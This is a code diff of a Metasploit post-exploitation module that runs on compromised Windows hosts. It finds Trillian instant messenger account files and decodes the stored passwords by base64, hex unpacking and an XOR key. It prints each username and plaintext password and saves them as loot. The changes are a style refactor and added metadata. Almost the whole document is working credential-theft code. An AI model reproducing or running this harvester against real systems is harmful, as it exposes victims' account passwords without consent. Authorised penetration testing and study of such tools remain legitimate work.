@@ -24,6 +24,11 @@ class MetasploitModule < Msf::Post
         ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [],
+          'Reliability' => []
+        },
         'Compat' => {
           'Meterpreter' => {
             'Commands' => %w[
@@ -40,12 +45,18 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    grab_user_profiles().each do |user|
-      accounts = user['AppData'] + "\\Trillian\\users\\global\\accounts.ini"
-      next if user['AppData'] == nil
+    grab_user_profiles.each do |user|
+      next if user['AppData'].nil?
+
+      accounts = user['AppData'] + '\\Trillian\\users\\global\\accounts.ini'
+
       next if accounts.empty?
 
-      stat = session.fs.file.stat(accounts) rescue nil
+      stat = begin
+        session.fs.file.stat(accounts)
+      rescue StandardError
+        nil
+      end
       next if stat.nil?
 
       get_ini(accounts)
@@ -53,49 +64,47 @@ class MetasploitModule < Msf::Post
   end
 
   def get_ini(file)
-    begin
-      config = client.fs.file.new(file, 'r')
-      parse = config.read
-      ini = Rex::Parser::Ini.from_s(parse)
+    config = client.fs.file.new(file, 'r')
+    parse = config.read
+    ini = Rex::Parser::Ini.from_s(parse)
 
-      if ini == {}
-        print_error("Unable to parse file")
-        return
-      end
-
-      creds = Rex::Text::Table.new(
-        'Header' => 'Trillian versions 4-5 Instant Messenger Credentials',
-        'Indent'	=> 1,
-        'Columns' =>
-        [
-          'User',
-          'Password'
-        ]
-      )
-
-      ini.each_key do |group|
-        username = ini[group]['Account']
-        epass = ini[group]['Password']
-        next if epass == nil or epass == ""
-
-        passwd = decrypt(epass).chop
-        print_good("User: #{username}  Password: #{passwd}")
-        creds << [username, passwd]
-      end
-
-      print_status("Storing data...")
-      path = store_loot(
-        'trillian.user.creds',
-        'text/csv',
-        session,
-        creds.to_csv,
-        'trillian_user_creds.csv',
-        'Trillian Instant Messenger User Credentials'
-      )
-      print_good("Trillian Instant Messenger user credentials saved in: #{path}")
-    rescue ::Exception => e
-      print_error("An error has occurred: #{e.to_s}")
+    if ini == {}
+      print_error('Unable to parse file')
+      return
     end
+
+    creds = Rex::Text::Table.new(
+      'Header' => 'Trillian versions 4-5 Instant Messenger Credentials',
+      'Indent'	=> 1,
+      'Columns' =>
+      [
+        'User',
+        'Password'
+      ]
+    )
+
+    ini.each_key do |group|
+      username = ini[group]['Account']
+      epass = ini[group]['Password']
+      next if epass.nil? || (epass == '')
+
+      passwd = decrypt(epass).chop
+      print_good("User: #{username}  Password: #{passwd}")
+      creds << [username, passwd]
+    end
+
+    print_status('Storing data...')
+    path = store_loot(
+      'trillian.user.creds',
+      'text/csv',
+      session,
+      creds.to_csv,
+      'trillian_user_creds.csv',
+      'Trillian Instant Messenger User Credentials'
+    )
+    print_good("Trillian Instant Messenger user credentials saved in: #{path}")
+  rescue StandardError => e
+    print_error("An error has occurred: #{e}")
   end
 
   def decrypt(epass)
@@ -109,12 +118,12 @@ class MetasploitModule < Msf::Post
     ]
 
     decpass = Rex::Text.decode_base64(epass)
-    plaintext = [decpass].pack("H*").unpack("C*")
+    plaintext = [decpass].pack('H*').unpack('C*')
 
     for i in 0..plaintext.length - 2 do
       plaintext[i] ^= magicarr[i]
     end
 
-    return plaintext.pack("C*")
+    return plaintext.pack('C*')
   end
 end
